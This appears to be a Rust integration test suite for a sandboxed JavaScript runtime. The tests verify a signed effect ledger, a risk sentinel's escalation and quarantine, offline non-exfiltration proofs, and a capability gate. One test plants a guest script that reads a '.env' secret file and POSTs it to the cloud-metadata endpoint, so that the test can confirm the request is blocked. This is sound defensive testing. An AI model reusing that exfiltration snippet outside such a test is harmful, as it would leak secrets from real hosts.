    assert_eq!(written, "tnr-pipeline-payload");
    let guest_stdout = run.report["dispatch"]["captured_output"]["stdout"]
        .as_str()
        .expect("captured stdout");
    assert!(
        guest_stdout.contains("tnr-payload-bytes 20"),
        "guest console output must surface the real read-back length: {guest_stdout:?}"
    );
    let receipt_path = run.report["receipt_path"].as_str().expect("receipt_path");
    assert!(
        workspace.path().join(receipt_path).is_file() || Path::new(receipt_path).is_file(),
        "run execution receipt must persist at {receipt_path}"
    );
    layer_pass(
        "L1 RUN real app under native engine",
        "exit=0, fs bytes on disk, console captured, receipt persisted",
    );

    // The loopback sink really observed the engine-framed request.
    let received = server.join().expect("server thread");
    let wire = String::from_utf8_lossy(&received);
    assert!(
        wire.starts_with("GET / HTTP/1.1\r\n"),
        "loopback sink must observe the engine-framed GET, got {wire:?}"
    );
    layer_pass("L1 RUN loopback sink observed egress", "GET / HTTP/1.1");

    // ---- L2 EFFECT: signed host-effect ledger with tamper-evident chain.
    let ledger = run.report["dispatch"]["host_effect_ledger"].clone();
    assert!(
        !ledger.is_null(),
        "native run must surface the host-effect ledger"
    );
    assert_eq!(ledger["schema_version"], json!("host-effect-ledger-v1.0"));
    let kinds: Vec<&str> = ledger["entries"]
        .as_array()
        .expect("entries")
        .iter()
        .map(|entry| entry["receipt"]["effect_kind"].as_str().expect("kind"))
        .collect();
    assert!(
        kinds.contains(&"fs_write")
            && kinds.contains(&"fs_read")
            && kinds.contains(&"http_request"),
        "ledger must carry all three host crossings, got {kinds:?}"
    );
    assert_eq!(
        ledger["allowed_count"], ledger["effect_count"],
        "clean run: every effect allowed"
    );
    assert_eq!(ledger["denied_count"], json!(0));
    let chain_head = ledger["chain_head_hash"].as_str().expect("chain head");
    assert!(chain_head.starts_with("sha256:"));
    layer_pass(
        "L2 EFFECT signed host-effect ledger",
        &format!("effects={} kinds={kinds:?}", ledger["effect_count"]),
    );

    // ---- L2.75 SENTINEL (bd-bg2hy): the dispatcher feeds the Bayesian
    // Runtime Sentinel from the signed ledger. A clean run is neutral
    // evidence: the anytime-valid e-value stays at 1.0, the expected-loss
    // action is Allow, and no escalation receipt is signed.
    let sentinel = &run.report["dispatch"]["sentinel"];
    assert!(
        !sentinel.is_null(),
        "native run must surface the sentinel report"
    );
    assert_eq!(
        sentinel["schema_version"],
        json!("runtime_sentinel.run_report.v1")
    );
    assert_eq!(
        sentinel["e_value_ppm"],
        json!(1_000_000),
        "clean evidence is exactly neutral: {sentinel}"
    );
    assert_eq!(sentinel["decision"]["selected_action"], json!("allow"));
    assert_eq!(sentinel["escalated"], json!(false));
    assert!(
        sentinel["escalation_receipt"].is_null(),
        "no escalation receipt on a clean run"
    );
    assert_eq!(
        sentinel["e_process_updates"]
            .as_array()
            .expect("e_process_updates")
            .len() as u64,
        ledger["effect_count"].as_u64().expect("effect_count"),
        "one e-process update per ledger entry"
    );
    layer_pass(
        "L2.75 SENTINEL fed from ledger (clean)",
        "e_value=1.0, action=allow, escalated=false",
    );
    // bd-fp1je: enforcement only fires on escalation; a clean run must not
    // carry an enforcement summary even with quarantine_on_high_risk=true.
    assert!(
        run.report["receipt"]["sentinel_enforcement"].is_null(),
        "a clean run must not trigger sentinel enforcement: {}",
        run.report["receipt"]["sentinel_enforcement"]
    );

    // ---- L3 LOG: ordered event codes, one trace id across the stream. The
    // host crossings surface as registered FN-EFFECT-002 events (bd-ihtox),
    // one per ledger entry, between dispatch (RUN-003) and receipt (RUN-004);
    // the sentinel feed surfaces as FN-SENTINEL-001/002/007 (bd-bg2hy).
    let events = structured_events(&run.stderr);
    assert_event_order(
        &events,
        &[
            "RUN-001",
            "RUN-003",
            "FN-EFFECT-002",
            "FN-SENTINEL-001",
            "FN-SENTINEL-002",
            "FN-SENTINEL-007",
            "RUN-004",
        ],
        CLEAN_TRACE_ID,
    );
    let effect_events = events
        .iter()
        .filter(|(code, _)| code == "FN-EFFECT-002")
        .count();
    assert_eq!(
        effect_events as u64,
        ledger["effect_count"].as_u64().expect("effect_count"),
        "one FN-EFFECT-002 event per ledger entry"
    );
    let sentinel_updates = events
        .iter()
        .filter(|(code, _)| code == "FN-SENTINEL-002")
        .count();
    assert_eq!(
        sentinel_updates as u64,
        ledger["effect_count"].as_u64().expect("effect_count"),
        "one FN-SENTINEL-002 e-process update per ledger entry"
    );
    assert!(
        !events.iter().any(|(code, _)| code == "FN-SENTINEL-008"),
        "a clean run must not emit an escalation receipt event"
    );
    layer_pass(
        "L3 LOG ordered RUN-*/FN-EFFECT-002/FN-SENTINEL-* events, single trace id",
        &format!("events={} effect_events={effect_events}", events.len()),
    );

    // ---- L5 VSDK: offline re-derivation (before replay so the auditor's
    // view is independent of the incident chain).
    verifier_sdk_leg(&ledger);

    // ---- L4 REPLAY: bundle → replay → counterfactual over the run's
    // receipts through the real CLI.
    let bundle_integrity_hash = incident_chain_leg(
        workspace.path(),
        "INC-TNR-CLEAN-0001",
        CLEAN_TRACE_ID,
        &ledger,
    );

    // ---- L6 LTV: CLI attest + offline SDK verify over chain + bundle.
    ltv_leg(
        workspace.path(),
        &run.report,
        "INC-TNR-CLEAN-0001.fnbundle",
        &bundle_integrity_hash,
        CLEAN_TRACE_ID,
    );

    println!(
        "[TNR-E2E] ================ CLEAN PIPELINE: ALL LAYERS PASS (trace_id={CLEAN_TRACE_ID})"
    );
}

/// The contained variant: the guest reads a recognized secret file (`.env`)
/// and attempts to exfiltrate its contents by POSTing them to the
/// cloud-metadata endpoint. Three layered controls fire: the SSRF egress gate
/// denies that endpoint BEFORE any socket opens, the information-flow lane
/// (bd-plhag) recognizes that the denied egress carries the secret's bytes and
/// records it as a flow BLOCK, and the Bayesian Runtime Sentinel (bd-bg2hy)
/// compounds the evidence into a real containment-ladder escalation with a
/// signed FN-SENTINEL-008 receipt carrying the e-value. The denial is surfaced
/// in the signed ledger (not masked by the exit code); the verifier SDK then
/// proves OFFLINE that the forbidden label was blocked before the sink, and
/// the full downstream pipeline — replay, counterfactual, LTV — runs over
/// that evidence.
#[test]
fn tnr_full_pipeline_denied_exfil_variant_contained() {
    let app = "const fs = require('fs');\n\
               const secret = fs.readFileSync('.env', 'utf8');\n\
               console.log('secret-bytes', secret.length);\n\
               const req = require('http').request('http://169.254.169.254/exfil', { method: 'POST' });\n\
               req.end(secret);\n";
    let workspace = bootstrap_workspace(app, "legacy-risky");
    std::fs::write(
        workspace.path().join(".env"),
        "TNR_FAKE_SECRET=not-a-real-secret-e2e-fixture-abcdef0123456789\n",
    )
    .expect("write fixture secret");

    let run = run_app(workspace.path(), EXFIL_TRACE_ID, "legacy-risky");

    // ---- L1 RUN: denial is containment-neutral for the ENGINE verdict
    // (Allow → exit 0); the fail-closed refusal happens pre-socket and lives
    // in the ledger. The product-side SENTINEL escalation asserted below is
    // operator-facing signed evidence, not the exit verdict.
    assert_eq!(
        run.exit_code,
        Some(0),
        "a single denied effect must not escalate engine containment; stderr:\n{}",
        run.stderr
    );
    layer_pass(
        "L1 RUN exfil variant executes under containment",
        "exit=0 (denial surfaced, not masked)",
    );

    // ---- L2 EFFECT: the read is allowed, the egress is denied, the chain
    // stays tamper-evident.
    let ledger = run.report["dispatch"]["host_effect_ledger"].clone();
    assert!(!ledger.is_null(), "ledger must be present");
    let denied = ledger["denied_count"].as_u64().expect("denied_count");
    assert!(
        denied >= 1,
        "the metadata egress must be refused fail-closed: {ledger}"
    );
    let entries = ledger["entries"].as_array().expect("entries");
    let denied_kinds: Vec<&str> = entries
        .iter()
        .filter(|entry| entry["receipt"]["policy_outcome"]["outcome"] != json!("allowed"))
        .map(|entry| entry["receipt"]["effect_kind"].as_str().expect("kind"))
        .collect();
    assert!(
        denied_kinds.contains(&"http_request"),
        "the denied crossing must be the exfil egress, got {denied_kinds:?} in {ledger}"
    );
    layer_pass(
        "L2 EFFECT exfil egress denied in signed ledger",
        &format!("denied_count={denied}"),
    );

    // ---- L2.5 FLOW (bd-plhag): the denied egress carries the secret's bytes,
    // so it is recorded as a flow BLOCK, and the verifier SDK proves offline
    // that the forbidden label was blocked before the sink.
    let secret_commitment =
        frankenengine_node::security::lineage_tracker::secret_file_label_set_commitment();
    let egress = entries
        .iter()
        .find(|entry| entry["receipt"]["effect_kind"] == json!("http_request"))
        .expect("http_request egress receipt");
    assert_eq!(
        egress["receipt"]["flow_policy_verdict"],
        json!("blocked"),
        "the denied secret egress must be a flow block: {egress}"
    );
    assert_eq!(
        egress["receipt"]["label_set_commitment"],
        json!(secret_commitment),
        "the egress must carry the secret label commitment"
    );
    // FN-FLOW-003 (sink blocked) is emitted for the blocked egress under the
    // pipeline trace id.
    let flow_events = structured_events(&run.stderr);
    assert_event_order(&flow_events, &["FN-FLOW-003"], EXFIL_TRACE_ID);
    // Offline non-exfiltration proof over the run's own ledger entries.
    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
        serde_json::from_str(&serde_json::to_string(&ledger["entries"]).unwrap())
            .expect("verifier SDK accepts the ledger wire shape");
    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://tnr-full-pipeline-exfil");
    let chain = sdk
        .verify_effect_chain_entries(&sdk_entries)
        .expect("effect chain re-derives offline");
    let claim = frankenengine_verifier_sdk::bundle::NonExfiltrationClaim {
        forbidden_label_set_commitments: vec![secret_commitment],
        external_sink_effect_kinds: vec!["http_request".to_string()],
        allowed_declassification_refs: vec![],
    };
    let non_exfil =
        frankenengine_verifier_sdk::bundle::verify_non_exfiltration_claim_in_report(&chain, &claim)
            .expect("non-exfiltration claim verifies: the secret was blocked before the sink");
    assert!(
        non_exfil
            .examined_effects
            .iter()
            .any(|e| e.effect_kind == "http_request" && e.proof_outcome == "blocked_before_sink"),
        "the SDK must classify the blocked secret egress as blocked_before_sink"
    );
    layer_pass(
        "L2.5 FLOW secret egress blocked + non-exfiltration proven",
        "flow_policy_verdict=blocked, SDK=blocked_before_sink",
    );

    // ---- L2.75 SENTINEL (bd-bg2hy): the planted-malicious workload drives a
    // REAL escalation. The sensitive `.env` read (likelihood ratio 1.5×) and
    // the blocked secret egress (500×) compound to an e-value of exactly 750:
    // the anytime-valid false-alarm bound (1/750 ≈ 0.13%) falls below alpha
    // (1%) and the expected-loss ladder selects quarantine. The escalation is
    // a SIGNED evidence entry carrying the e-value, verified OFFLINE here
    // against the run's surfaced verifying key.
    let sentinel = &run.report["dispatch"]["sentinel"];
    assert!(!sentinel.is_null(), "sentinel report must be present");
    assert_eq!(
        sentinel["e_value_ppm"],
        json!(750_000_000_u64),
        "sensitive read (1.5) × blocked exfil (500) = e 750: {sentinel}"
    );
    assert_eq!(sentinel["posterior_malice_bp"], json!(8_833));
    assert_eq!(
        sentinel["decision"]["selected_action"],
        json!("quarantine"),
        "expected-loss ladder must select quarantine for the exfil run"
    );
    assert_eq!(sentinel["escalated"], json!(true));
    let receipt_entry: frankenengine_node::observability::evidence_ledger::EvidenceEntry =
        serde_json::from_value(sentinel["escalation_receipt"].clone())
            .expect("escalation receipt deserializes as an evidence entry");
    let vk_hex = sentinel["escalation_verifying_key_hex"]
        .as_str()
        .expect("escalation verifying key surfaced");
    let vk_bytes: [u8; 32] = hex::decode(vk_hex)
        .expect("verifying key hex decodes")
        .try_into()
        .expect("verifying key is 32 bytes");
    let verifying_key =
        ed25519_dalek::VerifyingKey::from_bytes(&vk_bytes).expect("valid Ed25519 key");
    frankenengine_node::observability::evidence_ledger::verify_evidence_entry(
        &receipt_entry,
        &verifying_key,
    )
    .expect("escalation receipt signature verifies offline");
    assert_eq!(
        receipt_entry.payload["event_code"],
        json!("FN-SENTINEL-008")
    );
    assert_eq!(
        receipt_entry.payload["decision"]["e_value_ppm"],
        json!(750_000_000_u64),
        "the signed escalation receipt carries the e-value"
    );
    // The receipt is bound to its SOURCE ledger's trace id (the engine-side
    // workflow trace, same id the effect receipts carry) — internal
    // consistency, not the CLI --trace-id. Correlation to the CLI trace id is
    // the FN-SENTINEL-008 structured-log event asserted below.
    assert_eq!(
        ledger["trace_id"],
        json!(receipt_entry.trace_id),
        "escalation receipt must be bound to the ledger's workflow trace"
    );
    assert_eq!(sentinel["trace_id"], json!(receipt_entry.trace_id));
    layer_pass(
        "L2.75 SENTINEL escalation on planted-malicious run",
        "e_value=750, action=quarantine, FN-SENTINEL-008 receipt verified offline",
    );

    // ---- L3 LOG: same ordered contract, exfil trace id; the denied
    // crossing surfaces as an FN-EFFECT-002 event too (denial is evidence),
    // and the sentinel escalation surfaces as FN-SENTINEL-008.
    let events = structured_events(&run.stderr);
    assert_event_order(
        &events,
        &[
            "RUN-001",
            "RUN-003",
            "FN-EFFECT-002",
            "FN-SENTINEL-001",
            "FN-SENTINEL-002",
            "FN-SENTINEL-007",
            "FN-SENTINEL-008",
            "RUN-004",
        ],
        EXFIL_TRACE_ID,
    );
    let effect_events = events
        .iter()
        .filter(|(code, _)| code == "FN-EFFECT-002")
        .count();
    assert_eq!(
        effect_events as u64,
        ledger["effect_count"].as_u64().expect("effect_count"),
        "one FN-EFFECT-002 event per ledger entry (denied included)"
    );
    layer_pass(
        "L3 LOG ordered RUN-*/FN-EFFECT-002 events, single trace id",
        &format!("effect_events={effect_events}"),
    );

    // ---- L5 VSDK: the denial chain re-derives offline too.
    verifier_sdk_leg(&ledger);

    // ---- L4 REPLAY + L6 LTV over the denial evidence.
    let bundle_integrity_hash = incident_chain_leg(
        workspace.path(),
        "INC-TNR-EXFIL-0001",
        EXFIL_TRACE_ID,
        &ledger,
    );
    ltv_leg(
        workspace.path(),
        &run.report,
        "INC-TNR-EXFIL-0001.fnbundle",
        &bundle_integrity_hash,
        EXFIL_TRACE_ID,
    );

    // ---- L7 ENFORCE (bd-fp1je): the escalation drives product-side
    // enforcement and the loop closes: quarantine -> blocked rerun ->
    // audited release -> re-quarantine on re-escalation.
    sentinel_enforcement_leg(workspace.path(), &run, EXFIL_TRACE_ID);

    println!(
        "[TNR-E2E] ================ EXFIL VARIANT: CONTAINED + ALL LAYERS PASS (trace_id={EXFIL_TRACE_ID})"
    );
}

/// The third enforcement arm, pinned so the pipeline's profile choice stays
/// honest: under `balanced` the ENGINE capability gate itself refuses
/// `fs:write` before the effect happens — a hard interpreter abort (non-zero
/// exit, no bytes on disk), not a ledger-surfaced denial. This is the
/// capability-metering layer the bead's vision calls "capability-accounted
/// runtime kernel"; the pipeline tests above run under `legacy-risky`
/// precisely because it grants these capabilities, moving the enforcement
/// boundary to the SSRF gate where denials become signed ledger receipts.
#[test]
fn tnr_engine_capability_gate_fails_closed_under_balanced() {
    let app = "const fs = require('fs');\n\
               fs.writeFileSync('out.txt', 'must-never-land');\n";
    let workspace = bootstrap_workspace(app, "balanced");
    let run_output = Command::new(franken_node_bin())
        .current_dir(workspace.path())
        .args([
            "run",
            "app.js",
            "--policy",
            "balanced",
            "--runtime",
            "franken-engine",
            "--engine-bin",
            franken_node_bin(),
        ])
        .output()
        .expect("spawn franken-node run");

    assert!(
        !run_output.status.success(),
        "balanced must refuse the ungranted fs:write capability fail-closed"
    );
    let stderr = String::from_utf8_lossy(&run_output.stderr);
    assert!(
        stderr.contains("capability denied: fs:write"),
        "the refusal must name the denied capability, got:\n{stderr}"
    );
    assert!(
        !workspace.path().join("out.txt").exists(),
        "no bytes may land on disk after a capability refusal"
    );
    layer_pass(
        "L1 RUN engine capability gate (balanced)",
        "fs:write refused pre-effect, non-zero exit, no bytes on disk",
    );
}
